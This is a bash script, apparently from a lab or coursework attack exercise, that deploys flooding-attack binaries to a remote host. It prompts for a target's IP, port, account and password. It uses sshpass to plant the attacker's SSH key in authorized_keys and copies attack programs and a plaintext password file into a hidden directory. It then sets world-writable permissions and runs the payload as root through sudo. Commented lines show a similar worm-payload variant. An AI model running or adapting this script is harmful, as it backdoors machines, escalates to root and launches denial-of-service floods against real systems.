read -p "IP_address: " addr
read -p "Port: " port
read -p "Account: " account
read -p "Password: " password
read -p "Is this your first attack?(Y/N): " flag
export SSHPASS=${password}
echo ${password} > password

#passwordless process
#if [[ ! -f ~/.ssh/id_rsa ]]; then ssh-keygen -f ~/.ssh/id_rsa -N "" > /dev/null 2>&1; fi 
! [ -f ~/.ssh/id_rsa ] && ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa > /dev/null 2>&1
if [ ${flag} = "Y" ]; then
sshpass -e ssh -o "StrictHostKeyChecking no" -p ${port} ${account}@${addr} "mkdir .ssh > /dev/null 2>&1" 
sshpass -e scp -P ${port} ~/.ssh/id_rsa.pub ${account}@${addr}:~/.ssh/authorized_keys > /dev/null 2>&1
fi


#copy process
ssh -p ${port} ${account}@${addr} "mkdir ~/.Launching_Attack > /dev/null 2>&1" 
scp -P ${port} ./run ${account}@${addr}:~/.Launching_Attack/run > /dev/null 2>&1
scp -P ${port} ./Launching_Attack ${account}@${addr}:~/.Launching_Attack/Launching_Attack > /dev/null 2>&1
scp -P ${port} ./Flooding_Attack ${account}@${addr}:~/.Launching_Attack/Flooding_Attack > /dev/null 2>&1
scp -P ${port} ./Check_Attack ${account}@${addr}:~/.Launching_Attack/Check_Attack > /dev/null 2>&1
scp -P ${port} ./password ${account}@${addr}:~/.Launching_Attack/password > /dev/null 2>&1

#launch process
if [ ${flag} = "Y" ]; then
ssh -p ${port} ${account}@${addr} "chmod -R 777 ~/.Launching_Attack; cat ~/.Launching_Attack/password | sudo -S /home/victim/.Launching_Attack/run > /dev/null 2>&1"; else
ssh -p ${port} ${account}@${addr} "chmod -R 777 ~/.Launching_Attack; sudo /home/victim/.Launching_Attack/run > /dev/null 2>&1"
fi



#sshpass -e scp -P ${port} -r ./worm_payload_c_dir ${account}@${addr}:~/Downloads/.etc > /dev/null 2>&1
#sshpass -e scp -P ${port} ./run.sh ${account}@${addr}:~/Downloads/.etc/run.sh > /dev/null 2>&1
#sshpass -e ssh -p ${port} ${account}@${addr} "chmod 777 ~/Downloads/.etc/run.sh; chmod -R 777 ~/Downloads/.etc/worm_payload_c_dir; sudo ~/Downloads/.etc/run.sh" 
